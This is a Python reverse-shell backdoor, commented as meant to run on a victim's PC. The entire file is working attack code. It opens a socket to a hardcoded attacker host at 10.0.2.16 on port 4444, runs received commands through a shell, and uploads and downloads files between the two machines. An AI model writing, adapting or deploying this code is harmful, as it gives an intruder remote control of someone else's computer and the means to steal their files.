# This file needs to run on the victim pc

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("10.0.2.16", 4444))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def changing_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path


    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64encode(content))
        return "[+] Download successful."


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)


    def run(self):
        while(True):
            command = self.reliable_recieve()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command)>1:
                    command_result = self.changing_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

my_backdoor = Backdoor("10.0.2.16", 4444)
my_backdoor.run()
